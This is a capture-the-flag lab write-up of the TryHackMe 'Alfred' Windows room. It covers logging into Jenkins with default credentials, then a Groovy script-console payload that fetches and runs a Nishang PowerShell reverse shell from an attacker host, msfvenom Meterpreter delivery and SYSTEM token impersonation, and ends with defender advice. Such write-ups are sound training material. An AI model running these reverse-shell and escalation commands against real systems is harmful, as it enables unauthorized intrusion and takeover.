---
title: "Alfred"
date: 2026-03-03
platform: TryHackMe
difficulty: Easy
category: offensive
summary: "Jenkins default credentials to RCE, Nishang reverse shell, then SeImpersonatePrivilege abuse via Meterpreter Incognito for SYSTEM."
---

## Overview

Alfred is an easy TryHackMe Windows room with three lessons that come up in almost every internal pentest: **default credentials on a CI/CD platform**, **Jenkins script console as a code execution primitive**, and **SeImpersonatePrivilege abuse** to upgrade from a service account to SYSTEM.

## Tools Used

- **nmap** for the port scan.
- **A browser** to log into Jenkins.
- **Jenkins Script Console** for the code execution.
- **Nishang Invoke-PowerShellTcp** for the PowerShell reverse shell.
- **Metasploit Meterpreter** for the post-exploitation pivot.
- **Incognito** (Meterpreter module) for token impersonation.

## Methodology

**Step 1 - Service enumeration.** A nmap scan returns Jenkins running on a non-standard HTTP port. The login page is at /login.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - Default credentials.** Jenkins ships with no default credentials in modern installs, but a depressing number of organizations leave the *"first user"* set to *admin / admin*. The room reflects this. A handful of guesses against the login page lands an authenticated session.

**Step 3 - Jenkins Script Console.** Jenkins has a *Manage Jenkins → Script Console* feature that lets administrators run arbitrary Groovy code on the master node. This is a documented feature, not a vulnerability. It is also, by design, **direct code execution as the Jenkins service account**.

Navigate to */script* on the authenticated Jenkins instance. The text box accepts Groovy and runs it on submit.

**Step 4 - PowerShell reverse shell via Groovy.** The Groovy payload below pulls the Nishang PowerShell reverse shell from the attacker box and runs it in memory. This avoids dropping anything to disk that AV would notice.

```groovy
def proc = ["cmd.exe", "/c", "powershell iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <KALI_IP> -Port 4444"].execute()
proc.waitFor()
```

The `iex` part is *Invoke-Expression*, which evaluates a string as PowerShell. The downloaded script defines *Invoke-PowerShellTcp*, which is called immediately with reverse-shell parameters.

```bash
# attacker:
sudo python3 -m http.server 8000   # in the directory with Invoke-PowerShellTcp.ps1
nc -lvnp 4444                       # in another terminal
```

The shell lands as **alfred\bruce**, a low-privileged user.

**Step 5 - Upgrade to Meterpreter.** A standard reverse shell is fine but Meterpreter gives much better post-exploitation tooling (process listing, token enumeration, file ops). Generate a Meterpreter payload and pull it down:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=5555 -f exe -o shell.exe
```

```powershell
Invoke-WebRequest http://<KALI_IP>:8000/shell.exe -OutFile C:\Users\bruce\Desktop\shell.exe
.\shell.exe
```

A Meterpreter session lands.

**Step 6 - whoami /priv.** From the Meterpreter session, drop to a shell and check privileges.

```cmd
whoami /priv
```

The output shows **SeImpersonatePrivilege** is *Enabled*. This is one of the *"privilege equals SYSTEM"* tokens. Any process running with SeImpersonate can impersonate any thread token, and on a Windows system there is always *some* thread running as SYSTEM (because services do).

**Step 7 - Incognito token impersonation.** Meterpreter's **incognito** module enumerates available tokens on the box and lets you impersonate them.

```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid
```

If a SYSTEM token is available, the impersonation succeeds and the session is now running as SYSTEM.

**Step 8 - Read flags.** Both flags are now readable: bruce's *user.txt* on his Desktop, and the room's *root.txt* under `C:\Windows\System32\config\`.

## Key Takeaways

- **Jenkins script consoles are direct RCE primitives.** Anyone with admin access to Jenkins can run arbitrary code as the Jenkins service account. The login page is the entire perimeter.
- **Default credentials on internal CI/CD systems are everywhere.** Jenkins, Tomcat, JBoss, Confluence dev instances — admins forget to rotate or leave bootstrap accounts active.
- **SeImpersonatePrivilege equals SYSTEM.** Any token with this right can call *ImpersonateNamedPipeClient* against any pipe, including ones owned by SYSTEM services.
- **Nishang's Invoke-PowerShellTcp is the go-to PowerShell reverse shell** because it's small, in-memory only, and easy to invoke from a one-liner.

## What a Defender Should Do

- Rotate every default credential on every internal-facing tool, every time a new instance comes up. Run a credential audit weekly.
- Lock Jenkins down with role-based access control. The Script Console permission should be reserved for a tiny named group, never the default *admin* role.
- Place Jenkins (and similar CI/CD tools) behind authenticated reverse proxies. They should never be directly internet-reachable.
- Remove SeImpersonatePrivilege from service accounts that don't need it. The default IIS application pool identity has it, which is why JuicyPotato / PrintSpoofer / GodPotato exist.
- Monitor Sysmon EventID 1 for `powershell.exe` spawned by service processes like *Jenkins.exe* or *java.exe*. That parent/child relationship is high-confidence malicious.
- Disable PowerShell *Invoke-Expression* on a per-account basis with constrained language mode for service accounts that don't need scripting.
